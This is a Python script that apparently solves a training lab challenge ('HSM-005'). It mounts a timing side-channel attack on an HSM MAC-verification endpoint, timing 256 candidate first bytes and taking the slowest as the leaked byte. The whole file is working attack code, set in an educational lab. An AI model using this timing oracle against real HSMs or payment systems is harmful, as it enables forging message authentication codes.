#!/usr/bin/env python3
import json
import os
import statistics
import time
import urllib.request

HSM_URL = os.environ.get("HSM_URL", "http://10.10.10.11:8011/hsm/verify-mac")
SAMPLES_PER_CANDIDATE = int(os.environ.get("TIMING_SAMPLES", "20"))
STUDENT_ID = os.environ.get("STUDENT_ID", "")


def probe(candidate_hex: str) -> float:
    # Use student-specific data so the expected byte matches what prove-timing-attack computes
    data_field = f"{STUDENT_ID}:PAYLOAD" if STUDENT_ID else "PAYLOAD"
    payload = {
        "data": data_field,
        "keyLabel": "ZAK_002",
        "mac": f"{candidate_hex}00000000000000",
    }
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(HSM_URL, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    if STUDENT_ID:
        req.add_header("x-student-id", STUDENT_ID)

    start = time.perf_counter()
    with urllib.request.urlopen(req, timeout=5):
        pass
    return (time.perf_counter() - start) * 1000.0


def main() -> None:
    timing_data = []
    for value in range(256):
        candidate = f"{value:02x}"
        samples = [probe(candidate) for _ in range(SAMPLES_PER_CANDIDATE)]
        timing_data.append(
            {
                "candidate": candidate,
                "samples": samples,
                "avgMs": statistics.mean(samples),
            }
        )

    timing_data.sort(key=lambda row: row["avgMs"], reverse=True)
    discovered = timing_data[0]["candidate"]
    payload = {
        "challengeCode": "HSM-005",
        "discoveredByte": discovered,
        "timingData": timing_data,
    }
    print(json.dumps(payload))


if __name__ == "__main__":
    main()
